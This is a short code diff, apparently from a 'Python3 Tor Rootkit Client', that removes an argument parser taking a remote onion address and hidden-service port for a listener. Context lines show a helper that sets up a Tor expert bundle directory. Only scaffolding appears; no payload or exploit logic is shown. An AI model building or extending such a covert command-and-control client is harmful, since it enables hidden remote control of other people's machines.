@@ -12,7 +12,6 @@ from string import (
 )
 
 
-
 def get_tor_expert_bundle():
     # create directory for the tor expert bundle
     os.mkdir('torbundle')
@@ -39,14 +38,6 @@ def get_tor_expert_bundle():
 
     # change directory back to \client
     os.chdir('..')
-
-
-def parse_args():
-    parser = ArgumentParser(description='Python3 Tor Rootkit Client')
-    parser.add_argument('onion', type=str, help='The remote onion address of the listener.')
-    parser.add_argument('port', type=int, help='The remote hidden service port of the listener.')
-    args = parser.parse_args()
-    return args.onion, args.port
 
 
 if __name__ == '__main__':
